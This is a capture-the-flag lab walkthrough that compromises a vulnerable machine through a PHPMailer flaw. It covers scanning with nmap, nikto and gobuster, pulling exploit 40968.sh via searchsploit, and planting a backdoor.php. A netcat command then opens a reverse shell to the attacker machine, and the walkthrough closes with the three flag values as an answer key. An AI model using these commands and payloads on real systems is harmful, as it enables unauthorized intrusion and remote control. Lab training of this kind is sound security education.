# **TARGET 2 Offensive WalkThrough**

## Overview

You are working as a Security Engineer for X-CORP, supporting the SOC infrastructure. The SOC analysts have noticed some discrepancies with alerting in the Kibana system and the manager has asked the Security Engineering team to investigate.

To start, your team needs to confirm that newly created alerts are working. Once the alerts are verified to be working, you will monitor live traffic on the wire to detect any abnormalities that aren't reflected in the alerting system.

You must report your findings to the SOC manager and the engineering manager with appropriate analysis.

>##### Note: This walkthrough detail one method to exploit the vulnerable machine. There are several alternatives to explore.

---

Tools:

- Kali Linux
- Q shell
- Namp
- Nikto
- Gobuster
- FireFox Browser
- Searchsploit
- Bash Script
- NetCat

---

## **Walkthrough**

1. A glimpse at the Kali Linux machine IP and network addresses.

        ifconfig

    ![1](/Resources/Images/2/1.PNG)

2. Network FootPrinting (find machines on the network).

        nmap 192.168.1.0/24

    ![2](/Resources/Images/2/2.PNG)

3. Target2 fingerprinting (find services and ports on target2).

        nmap -sV 192.168.1.115 

    ![3](/Resources/Images/2/3.PNG)

4.  Look for Webserver vulnerabilities using Nikto.

        nikto -C all -h 192.168.1.115

    ![4](/Resources/Images/2/4.PNG)

5. Scan for paths using Gobuster.

        gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115

    ![5](/Resources/Images/2/5.PNG)

6. Explore path `192.168.1.115/vendor/` using the browser.
   
        192.168.1.115/vendor/

    **PHPMAILER detected.**

    ![6](/Resources/Images/2/6.PNG)     
   
7. Double click "PATH".

    **flag1**

    ![7](/Resources/Images/2/7.PNG)

8. Double "Click SECURITY.md".

    **It reveals vulnerable versions of PHPMAILER.**

    ![8](/Resources/Images/2/8.PNG)    

9.  Double "Click VERSION".

    **It reveals the PHPMAILER version in use.**

    ![9](/Resources/Images/2/9.PNG)  

10. Search for scripts to exploit PHPMAILER with Searchsploit.

        searchsploit phpmailer

    ![10](/Resources/Images/2/10.PNG)  

11. A glance at script 40968.sh

        searchsploit phpmailer -x php/webapps/40968.sh     

    **Press "q" keyboard to quit view.**

    ![11](/Resources/Images/2/11.PNG) 

12. Download the script to the current folder.

        searchsploit phpmailer -m php/webapps/40968.sh

    ![12](/Resources/Images/2/12.PNG)

13. Authorize file to execute.

        sudo chmod 777 40968.sh

14. Run exploit.

        ./40968.sh 192.168.1.115

    ![13](/Resources/Images/2/13.PNG)

    > Note: PHPMAILER can be exploited. Nevertheless,  the shell from this script does not allow us to do much. After researching, "exploit.sh" was discovered. It allows for creating a more useful shell.

    Script: [exploit.sh](/Resources/files/exploit.sh)

15. Change the URL on the script.

        nano exploit.sh

    ##### Note: **To exit nano: "CTRL X", then "y" and "enter".**

    ![14](/Resources/Images/2/14.PNG)

16. Authorize file to execute.

         sudo chmod 777 exploit.sh

17. Execute the file.

        ./exploit.sh

    ![15](/Resources/Images/2/15.PNG)

18. Set Kali Linux Machine to listen using the NetCat command.

         nc -lnvp 4444

    ![16](/Resources/Images/2/16.PNG)

19. Make Target2 call the Kali Linux machine with the NetCat command embedded in the next payload after running it in the browser.

        192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 4444 -e /bin/bash

    **Change the second IP address in the payload to the IP address of your own kali Linux machine.**

    ![17](/Resources/Images/2/17.PNG)

20. Look for flags.

        find /var/www -type f -iname 'flag*'

    **flag2 and flag3.**

    ![18](/Resources/Images/2/18.PNG)

21. Open the flag2 file.

        cat /var/www/flag2.txt

    **flag2**

    ![19](/Resources/Images/2/19.PNG)

23. Insert the path for flag 3 in the browser.

        http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png

    **flag3**
    
    ![20](/Resources/Images/2/20.PNG)

# FLAGS

flag1{a2c1f66d28051bd3a5874b5b6r43e21}

flag2{6a8ed560f0b5358ecf844108048eb337}

flag3{a0f568aa9de277887f37730d71520d9b}